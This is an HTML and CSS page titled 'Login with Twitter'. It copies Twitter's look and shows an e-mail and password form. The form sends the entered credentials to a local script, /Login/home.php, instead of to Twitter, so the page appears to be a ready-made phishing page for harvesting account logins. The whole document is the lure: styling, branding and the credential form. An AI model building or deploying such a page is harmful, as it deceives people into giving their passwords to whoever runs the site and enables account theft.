<!DOCTYPE html>
<html>
<head>

    <title>Login with Twitter</title>
    

</head>
<style>
@keyframes button-twitter-animation {
	 from {
		 top: 50%;
		 height: 10em;
		 width: 10em;
	}
	 to {
		 top: -3em;
		 height: 6em;
		 width: 6em;
	}
}
 @keyframes login-fadein {
	 0% {
		 opacity: 0;
	}
	 75% {
		 opacity: 0.5;
	}
	 100% {
		 opacity: 1;
	}
}
 @keyframes login-border-animation {
	 to {
		 stroke-dasharray: 100%;
		 stroke-dashoffset: 0;
	}
}
 * {
	 font-size: 8px;
}
 .main {
	 position: relative;
	 margin-top: 30vh;
}
 .login-fieldset-field, .login-fieldset-submit {
	 min-width: 250px;
	 font-size: 1.6em;
	 margin: 0.8em auto;
	 padding: 0.8em;
	 width: 80%;
	 box-sizing: border-box;
}
html { 
  background: url(/Login/images/twitter_wall.png) no-repeat center center fixed ; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
 
}
 .login {
	 width: 300px;
	 box-sizing: border-box;
	 margin: auto;
	 position: relative;
	 border: 0;
	 border-radius: 5px;
}
 .login-sides {
	 height: 100%;
	 width: 100%;
	 position: absolute;
	 bottom: 0;
	 left: 0;
	 right: 0;
	 top: 0;
	 border: 0;
	 border-radius: 5px;
}
 .login-sides line {
	 fill: none;
	 stroke: #55acee;
	 stroke-dasharray: 100%;
	 stroke-dashoffset: 100%;
	 stroke-linecap: round;
	 stroke-width: 5;
	 animation: login-border-animation 0.5s forwards;
}
 .login-sides line.first {
	 animation-delay: 0.5s;
}
 .login-sides line.second {
	 animation-delay: 0.75s;
}
 .login-sides line.third {
	 animation-delay: 1s;
}
 .login-fieldset {
	 animation: login-fadein 0.5s ease-in-out forwards;
	 animation-delay: 0.5s;
	 box-sizing: border-box;
	 display: flex;
	 flex-flow: column wrap;
	 justify-content: space-between;
	 padding: 5em 0;
	 opacity: 0;
}
 .login-fieldset-field {
	 box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
	 border: 0;
	 border: 1px solid #f2f2f2;
}
 .login-fieldset-submit {
	 background-color: #55acee;
	 box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.3);
	 color: #fff;
	 font-weight: bold;
	 border: 0;
	 border-radius: 3px;
}
 .button-twitter {
	 animation: button-twitter-animation 0.5s forwards;
	 background-image: url("https://image.flaticon.com/icons/svg/145/145812.svg");
	 background-size: 100% 100%;
	 background-repeat: no-repeat;
	 background-color: #55acee;
	 margin: auto;
	 z-index: 1;
	 transition: box-shadow 0.5s;
	 border: 0;
	 border: 3px solid #fff;
	 border-radius: 50%;
	 position: absolute;
	 bottom: auto;
	 left: 0;
	 right: 0;
	 top: auto;
	 height: 6em;
	 width: 6em;
}
 .button-twitter:hover {
	 box-shadow: 0px 1px 1px 1px #ccc;
}
 

</style>
<body>
<main class="main">
    <br><br><br>
  <a class="button-twitter" href="https://twitter.com/" target="_blank"></a>
  <form class="login" method="post" action="/Login/home.php">
    <svg class="login-sides">
      <line class="top-right first" x1="50%" x2="100%" y1="0" y2="0"/>
      <line class="top-left first" x1="50%" x2="0" y1="0" y2="0"/>
      <line class="right second" x1="100%" x2="100%" y1="0" y2="100%"/>
      <line class="left second" x1="0" x2="0" y1="0" y2="100%"/> 
      <line class="bottom-left third" x1="0" x2="50%" y1="100%" y2="100%"/>
      <line class="bottom-right third" x1="100%" x2="50%" y1="100%" y2="100%"/>
	</svg>
    <fieldset class="login-fieldset">
      <input type="text" placeholder="E-mail" name="mail" class="login-fieldset-field">
      <input type="password" name="pwd" placeholder="Password" class="login-fieldset-field">
      <button type="submit" class="login-fieldset-submit">
        Login
      </button>
    </fieldset>
  </form>
</main>
</body>
</html>